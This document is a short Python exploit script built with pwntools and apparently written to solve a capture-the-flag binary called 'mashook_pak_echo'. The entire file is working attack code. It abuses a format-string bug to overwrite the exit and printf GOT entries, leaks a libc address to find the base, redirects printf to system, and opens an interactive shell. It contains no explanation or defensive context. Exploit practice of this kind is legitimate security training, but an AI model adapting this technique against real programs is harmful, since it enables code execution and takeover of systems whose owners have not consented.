from pwn import *
elf = ELF('./mashook_pak_echo', checksec=False)
libc = ELF('./libc/libc6-i386_2.23-0ubuntu10_amd64.so', checksec=False)
p = elf.process()
payload = b''.join([
    b'XX',
    p32(elf.got['exit']),

    '%{0:d}x'.format(0x851b-2-4).encode(),b'%8$hn'
])
p.sendlineafter(b'.\n', payload)
p.clean()
p.sendline(b'%2$p')
libc.address = eval(p.recvline().strip().decode()) - libc.sym['_IO_2_1_stdin_']
log.info('base 0x%x'%libc.address)
log.info('printf 0x%x'%libc.sym['printf'])
log.info('system 0x%x'%libc.sym['system'])
payload = b''.join([
    b'XX',
    p32(elf.got['printf']),
    p32(elf.got['printf']+1),

    '%{0:d}x'.format(eval('0x' + hex(libc.sym['system'])[-2:])-2-8).encode(),b'%8$hhn',
    '%{0:d}x'.format(eval('0x' + hex(libc.sym['system'])[-6:-2])-eval('0x' + hex(libc.sym['system'])[-2:])).encode(),b'%9$hn'
])
p.sendlineafter(b'.\n', payload)
p.clean()
p.interactive()